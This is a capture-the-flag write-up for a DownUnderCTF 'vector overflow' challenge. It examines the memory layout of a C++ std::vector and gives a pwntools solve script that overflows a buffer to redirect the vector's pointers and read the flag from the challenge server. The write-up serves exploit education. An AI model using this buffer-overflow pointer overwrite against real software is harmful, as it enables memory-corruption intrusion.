---
ai_date: 2025-04-27 05:15:26
ai_summary: Overflow exploit using buffer overflow to modify vector's address and achieve RCE, payload includes address of 'buf'
ai_tags:
  - buffer-overflow
  - rop
  - rce
created: 2024-07-05T19:31
description: Where do vectors point to?
points: 100
solves: 239
updated: 2025-07-14T09:46
---

## Analysis

A simple overflow challenge, where we have to modify a vector's values to `DUCTF`.

```cpp
char buf[16];
std::vector<char> v = {'X', 'X', 'X', 'X', 'X'};
```

Since this is something new for me, let's examine the memory structure with a custom function.

```cpp
#include <iomanip>
void printMemory(void *startAddress, size_t length){
    unsigned char *address = static_cast<unsigned char *>(startAddress);
    for (size_t i = 0; i < length; ++i) {
        std::cout << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(address[i]) << ' ';
        if ((i + 1) % 16 == 0) std::cout << std::endl;
    }
    if (length % 16 != 0) std::cout << std::endl;
}
```

```
memory starting from 'buf'
44 55 43 54 46 41 41 41 41 41 41 41 41 41 41 41 <buf>
b0 2e 8c 00 00 00 00 00 b5 2e 8c 00 00 00 00 00 <vec>
b5 2e 8c 00 00 00 00 00 00 00 00 00 00 00 00 00 <vec>
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
```

Looking through llvm definitions...

```cpp
template <class _Tp, class _Allocator>
inline _LIBCPP_INLINE_VISIBILITY
__vector_base<_Tp, _Allocator>::__vector_base()
        _NOEXCEPT_(is_nothrow_default_constructible<allocator_type>::value)
    : __begin_(nullptr),
      __end_(nullptr),
      __end_cap_(nullptr)
{
}
```

It seems those three 8 byte values are `begin`, `end` and `end_cap` resp.
## Attack

We can overwrite `buf` to `DUCTFAAAAAAAAAAA`, followed by the address of `buf` encoded, so the vector is now pointing to `buf`.

By looking at the decompiled code of the challenge, we can find the address of `buf` to be `0x4051e0` (with the help of Godbolt).

![image.png](https://res.cloudinary.com/kumonochisanaka/image/upload/v1720224977/2024/07/ac6d54f8474b94456be9b46d305410db.png)

![image.png](https://res.cloudinary.com/kumonochisanaka/image/upload/v1720225053/2024/07/0961ccc9368b9a43f078e593b3a663b1.png)

We can craft our payload like this.

```python
payload = b'DUCTF' + b'A'*11 + loc + end + end
```

### Solve Script

```python
from pwn import *
context.log_level = 'error'
loc = 0x4051e0
end = loc + 5
loc = loc.to_bytes(8, byteorder='little')
end = end.to_bytes(8, byteorder='little')
payload = b'DUCTF' + b'A'*11 + loc + end + end
conn = remote("2024.ductf.dev", 30013)
conn.sendline(payload)
conn.sendline(b"cat flag.txt")
print(conn.recv())

# b'DUCTF{y0u_pwn3d_th4t_vect0r!!}\n'
```